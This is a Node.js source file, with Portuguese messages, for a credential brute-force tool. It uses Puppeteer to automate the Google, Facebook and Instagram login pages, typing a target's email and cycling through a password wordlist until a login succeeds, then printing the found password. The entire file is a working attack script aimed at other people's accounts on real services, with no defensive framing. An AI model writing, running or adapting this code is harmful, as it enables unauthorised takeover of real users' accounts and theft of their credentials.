const axios = require("axios")
const puppeteer = require("puppeteer")
const { ArgumentParser } = require("argparse")
const fs = require("fs")
require("colors")

const parser = new ArgumentParser({ description: "parameters example" })

const banner = `
                        _
                       //
                      //
             _.-\`\`\`\`'//_
         ,-'\`       //  \`'-.,_
 /)     (\         //        '\`\`-.
( ( .,-') )       //             \`\`
 \)'   (_/       \`#'              !!
  |       /)     ###   '          !!!
  \`\    X'       ###  '     !    !!!!
    !      _/! , !## !  ! !  !   !!!
     \Y,   |!!!  ! #! !!  !! !!!!!!!
       \`!!! !!!! !!# )!!!!!!!!!!!!!
        !!  ! ! \( \(  !!!|/!  |/!
               /_(/#(    /_(  /_(
                 %%%%
                %%%%%%%
                 %%%%%%%
                   %%%%
                      %%
`

parser.add_argument("-s", "--site",  { help: "facebook, instagram, google" })
parser.add_argument("-e", "--email", { help: "email or id" })
parser.add_argument("-p", "--password", { help: "password file with wordlist.txt" })

const { site, email, password } = parser.parse_args()

const userAgent = "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
const viewPort = { width: 1006, height: 550 }

class brute {
  constructor(site, email, passwordFile) {
    this.site = site
    this.email = email
    this.passwordFile = passwordFile
    console.clear()
    console.log(banner.bold)
    console.log(`COMEÇANDO O ATAQUE EM: ${this.site}\n`.bold.green)
  }

  async test() {
    try { await axios.get("https://http.cat") } 
    catch {
      console.log("\n[!] INTERNET: OFF\n".underline.yellow)
      process.exit(1)
    }
  }

  testFile() {
    fs.readFile(this.passwordFile, { encoding: "utf-8" }, err => {
      if (err) {
        console.log("\n[!] NÃO FOI POSSIVEL ENCONTRAR A WORDLIST\n".underline.yellow)
        process.exit(1)
      }
    })
  }

  loadConfig() {
    let data = fs.readFileSync("./config.json", { encoding: "utf-8" })
    let dataParse = JSON.parse(data)
    let config
    switch(this.site) {
      case "facebook":
        config = dataParse.facebook
        break
      case "instagram":
        config = dataParse.instagram
        break
      case "pinterest":
        config = dataParse.pinterest
        break
      case "google":
        config = dataParse.google
    }
    return config
  }

  async attackGoogle() {
    let config = this.loadConfig()
    let { url, inputEmail, inputPassword, buttonSubmit, msgError } = config
    this.testFile()
    let passwordList = fs.readFileSync(this.passwordFile, { encoding: "utf-8" })

    let browser = await puppeteer.launch({ args: ['--no-sandbox'], headless: false })

    let page = await browser.newPage()
    await page.setExtraHTTPHeaders({ "accept-language": "en-US,en;q=0.9,hy;q=0.8" })
    await page.setUserAgent(userAgent)
    await page.setViewport(viewPort)
    for(let password of passwordList.split(/\r?\n/)) {
      await page.goto(url)
      await page.type(inputEmail, this.email)
      await page.click(buttonSubmit)
      await page.waitForNavigation()
      await page.type(inputPassword, password)
      await page.click(buttonSubmit)
      await page.waitForNavigation()
      let pageContent = await page.content()
      let urlPage = page.url()
      if(urlPage === url || pageContent.indexOf(msgError) !== -1) {
        console.log(`[-] SENHA ERRADA: ${password}`.red)
      } else {
        console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green)
        break
      }
    }
  }

  async attackFacebook() {
    let config = this.loadConfig()
    let { url, inputEmail, inputPassword, buttonSubmit, msgError } = config
    this.testFile()
    let passwordList = fs.readFileSync(this.passwordFile, { encoding: "utf-8" })
    
    let browser = await puppeteer.launch({ args: ['--no-sandbox'], headless: false })

    let page = await browser.newPage()
    await page.setUserAgent(userAgent)
    await page.setViewport(viewPort)

    await page.goto(url)
    await page.type(inputEmail, this.email)
    for(let password of passwordList.split(/\r?\n/)) {
      await page.type(inputPassword, password)
      await page.click(buttonSubmit)
      await page.waitForNavigation()
      let pageContent = await page.content()
      let urlPage = page.url()
      if(urlPage === url || pageContent.indexOf(msgError) !== -1) {
        console.log(`[-] SENHA ERRADA: ${password}`.red)
        await page.goBack()
      } else {
        console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green)
        break
      }
    }
  }

  async attackInstagram() {
    let config = this.loadConfig()
    let { url, inputEmail, inputPassword, buttonSubmit, msgError } = config
    this.testFile()
    let passwordList = fs.readFileSync(this.passwordFile, { encoding: "utf-8" })
    
    let browser = await puppeteer.launch({ args: ['--no-sandbox'], headless: false })

    let page = await browser.newPage()
    await page.setExtraHTTPHeaders({ "accept-language": "en-US,en;q=0.9,hy;q=0.8" })
    await page.setUserAgent(userAgent)
    await page.setViewport(viewPort)

    await page.goto(url)
    
    for(let password of passwordList.split(/\r?\n/)) {
      await page.type(inputEmail, this.email)
      await page.type(inputPassword, password)
      await page.click(buttonSubmit)
      let pageContent = await page.content()
      let urlPage = page.url()
      if(urlPage === url || pageContent.indexOf(msgError) !== -1) {
        console.log(`[-] SENHA ERRADA: ${password}`.red)
        await page.goBack()
      } else {
        console.log(`\n[+] SENHA ENCONTRADA: ${password}\n`.bold.green)
        break
      }
    }
  }
}

new brute().test()
switch(site) {
  case "facebook":
    new brute(site, email, password).attackFacebook()
    break
  case "instagram":
    new brute(site, email, password).attackInstagram()
    break
  case "pinterest":
    console.log("ainda não foi feito.")
    break
  case "google":
    new brute(site, email, password).attackGoogle()
}
